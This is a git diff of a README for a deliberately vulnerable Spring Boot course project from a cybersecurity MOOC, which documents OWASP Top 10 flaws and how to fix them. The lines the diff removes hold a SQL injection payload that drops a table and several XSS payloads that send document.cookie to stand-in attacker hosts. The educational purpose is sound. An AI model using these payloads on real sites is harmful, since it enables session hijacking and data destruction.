@@ -1,6 +1,7 @@
 # Cyber Security Base 2019 -course project
 
 This app is a project created for MOOC course Cyber Security Base 2019-2020.
+https://cybersecuritybase.mooc.fi/
 
 ## Project assignment
 The task is to create a web application that has at least five different flaws from the OWASP top ten list (https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf).
@@ -21,7 +22,7 @@ Security flaws enable attacker to..
 
 
 ## How to exploit and fix the security flaws
-## LINK: https://github.com/nurvel/spring-owasp-vulnerable-app
+### LINK: https://github.com/nurvel/spring-owasp-vulnerable-app
 
 ### Running and using the appication
 The app is created with Spring Boot. You can start up the app in IDE or on command line with ```mvn spring-boot:run```
@@ -33,12 +34,12 @@ The database is H2 and will be initialized with necessary data on every startup.
 Log in as Student and Teacher with different browsers or using the Incognito-mode for other user:
 
 **Log in as student**
-**Username:** student
-**Password:** password
+* **Username:** student
+* **Password:** password
 
 **Log in as teacher**
-**Username:** teacher
-**Password:** password
+* **Username:** teacher
+* **Password:** password
 
 
 ### FLAW 1: A1:2017-Injection
@@ -110,7 +111,6 @@ The ULR path to the Teachers Lounge should be limited to only users with teacher
 
 ```
 
-
 ### FLAW 5: A7:2017-Cross-Site Scripting (XSS)
 #### OWASP description of the security flaw:
 >XSS flaws occur whenever an application includes untrusted data in a new web page without
@@ -135,7 +135,7 @@ The thymelead file course.html does not escape the string when rendering the pag
 ```
 
 
-### FLAW X: A6:2017-Security Misconfiguration
+### FLAW 6: A6:2017-Security Misconfiguration
 #### OWASP description of the security flaw:
 >Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure
 default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured
@@ -148,37 +148,15 @@ H2 data base URL not secured and using default password.
 #### How to fix the security flaw in the app
 Change default password to H2
 
-
-
-
-### FLAW 4: A10:2017-Insufficient Logging & Monitoring
+### FLAW 7: A10:2017-Insufficient Logging & Monitoring
 #### OWASP description of the security flaw:
-Insufficient logging and monitoring, coupled with missing or ineffective integration with incident
+> Insufficient logging and monitoring, coupled with missing or ineffective integration with incident
 response, allows attackers to further attack systems, maintain persistence, pivot to more systems,
 and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over
 200 days, typically detected by external parties rather than internal processes or monitoring.
+
 #### How the security flaw behaves in the app
+There is no logging in the application that gives indication of the users actions (who has done what). This does not give any help if a breach is noticed and it is needed to investigate that who has manipulated the grades.
+
 #### How to fix the security flaw in the app
-
-
-
-
--- SQL injection =>  Hello insert
-=> drop table?
-
-INSERT INTO signup (address, name) VALUES ('testijuttu', 'moikka')
-
-INSERT INTO signup (address, name) VALUES ('testijuttu', '
-Bye bye courses!') ; DROP TABLE course; --
-')
-
-style=\"display: none;\"
-
-<script>document.write("<img src=\"http://www.haxor.com/cookiesteal/" + document.cookie +"\" style=\"display: none;\" />")  </script>
-
-# ALLA OLEVA TOIMII
-<script>document.write("<img src=\"http://www.haxor.com/cookisteal/" + document.cookie +"\"/>")  </script>
-
-<script>fetch("http://www.haxor.com/cookisteal/" + document.cookie) </script>
-document.cookie="JSESSIONID=12EE43AF515F83867B20D94907108063"
-<img src='https://yourserver.evil.com/collect.gif?cookie=' + document.cookie/>
+There should be logging set that logs the info of who has given the grades to the students.
